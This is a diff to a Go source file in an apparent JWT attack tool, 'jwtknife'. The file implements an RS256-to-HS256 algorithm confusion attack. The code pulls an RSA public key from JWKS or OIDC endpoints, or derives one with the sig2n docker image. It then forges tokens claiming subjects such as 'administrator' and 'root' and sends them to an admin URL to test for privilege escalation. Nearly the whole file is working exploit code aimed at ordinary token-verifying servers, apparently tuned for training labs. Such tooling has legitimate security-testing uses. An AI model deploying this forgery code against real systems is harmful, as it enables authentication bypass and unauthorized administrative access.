@@ -13,6 +13,7 @@ import (
 	"math/big"
 	"net/http"
 	"net/url"
+	"os/exec"
 	"strings"
 
 	"jwtknife/internal/httpx"
@@ -20,8 +21,7 @@ import (
 	"jwtknife/internal/report"
 )
 
-// AlgConfusionAttack implements RS256 -> HS256 algorithm confusion
-// using the server's RSA public key as the HMAC secret.
+// AlgConfusionAttack implements RSA → HMAC algorithm confusion attacks.
 type AlgConfusionAttack struct{}
 
 type jwks struct {
@@ -36,6 +36,28 @@ type jwkRSA struct {
 
 type oidcConfig struct {
 	JWKSURI string `json:"jwks_uri"`
+}
+
+func fetchURL(u string) ([]byte, int, error) {
+	resp, err := http.Get(u)
+	if err != nil {
+		return nil, 0, err
+	}
+	defer resp.Body.Close()
+	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
+	return b, resp.StatusCode, nil
+}
+
+func resolveJWKSURI(baseURL string, jwksURI string) (string, error) {
+	base, err := url.Parse(strings.TrimRight(baseURL, "/") + "/")
+	if err != nil {
+		return "", err
+	}
+	u, err := url.Parse(strings.TrimSpace(jwksURI))
+	if err != nil {
+		return "", err
+	}
+	return base.ResolveReference(u).String(), nil
 }
 
 func rsaPublicKeyFromJWKS(body []byte) ([]byte, error) {
@@ -65,71 +87,41 @@ func rsaPublicKeyFromJWKS(body []byte) ([]byte, error) {
 	}
 
 	n := new(big.Int).SetBytes(nb)
-	e := new(big.Int).SetBytes(eb).Int64()
+	e := int(new(big.Int).SetBytes(eb).Int64())
 	if e == 0 {
 		return nil, errors.New("invalid RSA exponent")
 	}
 
-	pub := &rsa.PublicKey{
-		N: n,
-		E: int(e),
-	}
-
+	pub := &rsa.PublicKey{N: n, E: e}
 	der, err := x509.MarshalPKIXPublicKey(pub)
 	if err != nil {
 		return nil, err
 	}
 
-	block := &pem.Block{
+	return pem.EncodeToMemory(&pem.Block{
 		Type:  "PUBLIC KEY",
 		Bytes: der,
-	}
-	return pem.EncodeToMemory(block), nil
+	}), nil
 }
 
-func fetchURL(u string) ([]byte, int, error) {
-	resp, err := http.Get(u)
-	if err != nil {
-		return nil, 0, err
-	}
-	defer resp.Body.Close()
-	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
-	return b, resp.StatusCode, nil
-}
-
-func resolveJWKSURI(baseURL string, jwksURI string) (string, error) {
-	// jwks_uri is often absolute, but may be relative. Resolve against the base.
-	base, err := url.Parse(strings.TrimRight(baseURL, "/") + "/")
-	if err != nil {
-		return "", err
-	}
-	u, err := url.Parse(strings.TrimSpace(jwksURI))
-	if err != nil {
-		return "", err
-	}
-	return base.ResolveReference(u).String(), nil
-}
-
-// NewAlgConfusionAttack constructs the attack.
 func NewAlgConfusionAttack() Attack {
 	return AlgConfusionAttack{}
 }
 
 func (AlgConfusionAttack) Name() string {
-	return "alg-confusion-rs256-hs256"
+	return "alg-confusion"
 }
 
 func (AlgConfusionAttack) Run(in AttackInput) report.AttackResult {
 	ar := report.NewAttackResult("alg-confusion")
 
-	// Only makes sense if original token is asymmetric
 	if !strings.HasPrefix(strings.ToUpper(in.ParsedJWT.Alg), "RS") {
 		ar.Outcome = report.OutcomeNoEffect
 		ar.Note = "original token is not RSA-signed"
 		return ar
 	}
 
-	// Try common JWKS endpoints, but only check for HTTP 200 status.
+	// ===== Phase 1: try to obtain public key via JWKS =====
 	jwksPaths := []string{
 		"/jwks.json",
 		"/.well-known/jwks.json",
@@ -137,56 +129,78 @@ func (AlgConfusionAttack) Run(in AttackInput) report.AttackResult {
 	}
 
 	var pubKeyPEM []byte
-
-	algUpper := strings.ToUpper(in.ParsedJWT.Alg)
+	base := strings.TrimRight(in.Targets.PublicURL, "/")
 
 	for _, path := range jwksPaths {
-		// Start from the public (no-auth) base URL the user provided.
-		base := strings.TrimRight(in.Targets.PublicURL, "/")
-		u := base + path
-
-		body, status, err := fetchURL(u)
+		body, status, err := fetchURL(base + path)
 		if err != nil || status != 200 {
 			continue
 		}
 
 		jwksBody := body
 
-		// If this is OIDC discovery, follow jwks_uri to fetch the actual JWKS.
 		if strings.Contains(path, "openid-configuration") {
 			var cfg oidcConfig
-			if err := json.Unmarshal(body, &cfg); err != nil || strings.TrimSpace(cfg.JWKSURI) == "" {
+			if err := json.Unmarshal(body, &cfg); err != nil || cfg.JWKSURI == "" {
 				continue
 			}
-
 			jwksURL, err := resolveJWKSURI(base, cfg.JWKSURI)
 			if err != nil {
 				continue
 			}
-
-			b2, status2, err := fetchURL(jwksURL)
-			if err != nil || status2 != 200 {
+			b2, s2, err := fetchURL(jwksURL)
+			if err != nil || s2 != 200 {
 				continue
 			}
 			jwksBody = b2
 		}
 
-		// This attack file currently implements RS256 -> HS256 confusion.
-		if strings.HasPrefix(algUpper, "RS") {
-			if k, err := rsaPublicKeyFromJWKS(jwksBody); err == nil {
-				pubKeyPEM = k
-				break
-			}
+		if k, err := rsaPublicKeyFromJWKS(jwksBody); err == nil {
+			pubKeyPEM = k
+			break
 		}
 	}
 
+	// ===== Phase 2: no JWKS — sig2n-style scenario =====
 	if pubKeyPEM == nil {
-		ar.Outcome = report.OutcomeNoEffect
-		ar.Note = "unable to extract RSA public key from JWKS"
+		step := report.Step{
+			Label:   "alg-confusion-sig2n",
+			Details: "No exposed JWKS. Attempting RSA public key derivation using sig2n (docker).",
+		}
+
+		ar.Steps = append(ar.Steps, step)
+
+		if strings.TrimSpace(in.SecondRawJWT) == "" {
+			ar.Outcome = report.OutcomeInteresting
+			ar.Note = "No exposed JWKS. Provide a second server-issued JWT to attempt RSA public key derivation (sig2n)."
+			return ar
+		}
+
+		cmd := exec.Command(
+			"docker", "run", "--rm", "-i",
+			"portswigger/sig2n",
+			in.RawJWT,
+			in.SecondRawJWT,
+		)
+
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			ar.Outcome = report.OutcomeInteresting
+			ar.Note = "sig2n execution failed or docker unavailable"
+			ar.Errors = append(ar.Errors, err.Error())
+			return ar
+		}
+
+		step.Details = "sig2n executed successfully; manual key validation required"
+		step.JWT.Token = strings.TrimSpace(string(out))
+		ar.Steps = append(ar.Steps, step)
+
+		ar.Outcome = report.OutcomeInteresting
+		ar.Note = "RSA modulus candidates derived via sig2n. Validate X.509 key and re-run alg confusion."
 		return ar
 	}
 
-	// Modify token: alg=HS256, sub=administrator
+	// ===== Phase 3: RS → HS confusion using recovered public key =====
 	p, err := jwtknifejwt.Parse(in.RawJWT)
 	if err != nil {
 		ar.Outcome = report.OutcomeError
@@ -196,66 +210,43 @@ func (AlgConfusionAttack) Run(in AttackInput) report.AttackResult {
 
 	p.Header["alg"] = "HS256"
 
-	subjects := []string{
-		"administrator",
-		"admin",
-		"root",
-		"superuser",
-		"carlos",
-	}
+	subjects := []string{"administrator", "admin", "root", "superuser", "carlos"}
 
 	for _, sub := range subjects {
 		p.Payload["sub"] = sub
 
 		rebuilt, err := jwtknifejwt.Rebuild(p)
 		if err != nil {
-			ar.Outcome = report.OutcomeError
-			ar.Errors = append(ar.Errors, err.Error())
-			return ar
+			continue
 		}
 
-		// Use the *entire original RS256 public key exposure assumption* as HMAC secret.
-		// This matches real-world alg confusion behavior.
 		parts := strings.SplitN(rebuilt, ".", 3)
 		if len(parts) < 2 {
-			ar.Outcome = report.OutcomeError
-			ar.Errors = append(ar.Errors, "failed to rebuild unsigned token")
-			return ar
+			continue
 		}
 
 		unsigned := parts[0] + "." + parts[1]
 
-		type secretVariant struct {
-			label string
-			key   []byte
+		variants := [][]byte{
+			pubKeyPEM,
+			[]byte(base64.StdEncoding.EncodeToString(pubKeyPEM)),
 		}
 
-		variants := []secretVariant{
-			{
-				label: "raw-pem",
-				key:   pubKeyPEM,
-			},
-			{
-				label: "base64-pem",
-				key:   []byte(base64.StdEncoding.EncodeToString(pubKeyPEM)),
-			},
-		}
-
-		for _, v := range variants {
-			h := hmac.New(sha256.New, v.key)
+		for _, key := range variants {
+			h := hmac.New(sha256.New, key)
 			h.Write([]byte(unsigned))
 			sig := base64.RawURLEncoding.EncodeToString(h.Sum(nil))
 			forged := unsigned + "." + sig
 
 			step := report.Step{
 				Label:   "alg-confusion",
-				Details: "RS256 → HS256 (alg confusion) using " + v.label,
+				Details: "RS256 → HS256 using derived RSA public key",
 				JWT:     report.JWTInfo{Token: forged},
 			}
 
 			if in.Client != nil && in.Targets.AdminURL != "" {
 				r := in.Client.Do(httpx.RequestPlan{
-					Label:     "admin-alg-confusion",
+					Label:     "alg-confusion-admin",
 					URL:       in.Targets.AdminURL,
 					Method:    in.Targets.Method,
 					JWT:       forged,
@@ -264,22 +255,10 @@ func (AlgConfusionAttack) Run(in AttackInput) report.AttackResult {
 				step.HTTP = report.FromHTTPResult(r)
 
 				if report.IsAdminSuccess(in.Baseline, step.HTTP) {
-					_ = in.Client.Do(httpx.RequestPlan{
-						Label:     "admin-alg-confusion-reuse",
-						URL:       in.Targets.AdminURL,
-						Method:    in.Targets.Method,
-						JWT:       forged,
-						Placement: in.Targets.Placement,
-					})
-
 					ar.Steps = append(ar.Steps, step)
 					ar.Outcome = report.OutcomeSuccess
-					ar.Note = "admin access via algorithm confusion (" + v.label + "); lab-style RSA→HMAC confusion"
+					ar.Note = "admin access via RSA→HMAC algorithm confusion"
 					return ar
-				}
-
-				if report.IsInteresting(in.Baseline, step.HTTP) {
-					ar.Outcome = report.OutcomeInteresting
 				}
 			}
 
